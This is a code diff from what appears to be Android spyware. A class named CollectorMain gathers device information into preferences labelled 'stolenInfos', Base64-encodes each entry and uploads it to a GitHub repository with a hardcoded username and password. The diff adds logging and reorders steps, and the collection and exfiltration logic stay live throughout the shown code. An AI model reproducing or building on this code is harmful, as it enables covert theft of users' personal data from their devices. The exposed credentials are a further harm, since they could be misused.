@@ -62,27 +62,29 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		sb=stolenInfos=getSharedPreferences("majeste",MODE_PRIVATE);
 		running = true;
 		try {
-			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
-			Repository repo=null;
-			List<RepositoryContents> cont=null;
+			Log.d("CollectorMain", "start");
 			String s="";
-			SharedPreferences.Editor edt=sb.edit();
 			try {
-				edt.putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos()));
+				sb.edit().putString(System.currentTimeMillis() + ".json", new Gson().toJson(new Infos())).commit();
+				Log.d("CollectorMain", "collect");
 			} catch (Throwable e) {
 
 			} finally {
 				System.out.println(s);
-				edt.commit();
-				edt=sb.edit();
 			}
+			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
+			Repository repo=null;
+			List<RepositoryContents> cont=null;
+			SharedPreferences.Editor edt=sb.edit();
 			String[] files=Constant.EMPTY_STRING_ARRAY;
 			try {
 				files = sb.getAll().keySet().toArray(new String[sb.getAll().size()]);
 			    repo = new RepositoryService(ghc).getRepository("RevealEverything", "Files");
 			    cont = new ContentsService(ghc).getContents(repo);
+				Log.d("CollectorMain", "get");
 			} catch (Throwable e) {
 				DebugWriter.writeToE("CollectorMain",e);
+				return;
 			}
 			try {
 				for (String filename:files) {
@@ -101,6 +103,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 								continue;
 							}
 						} catch (Throwable e) {
+							DebugWriter.writeToE("CollectionMain",e);
 							Log.d("CollectorMain", "skipped");
 						}
 						params.put("content", Base64.encodeToString(file, Base64.NO_WRAP));
@@ -113,13 +116,15 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 					}
 				}
 			} catch (Throwable e) {
-
+				DebugWriter.writeToE("CollectorMain",e);
 			}finally{
 				edt.commit();
+				Log.d("CollectorMain", "saveTotal");
 			}
 		} catch (Throwable e) {
 			DebugWriter.writeToE("CollectorMain",e);
 		} finally {
+			Log.d("CollectorMain", "end");		
 			running=false;
 			for (String s:sb.getAll().keySet()) {
 				Log.d("CollectorMain", "remain: "+s);
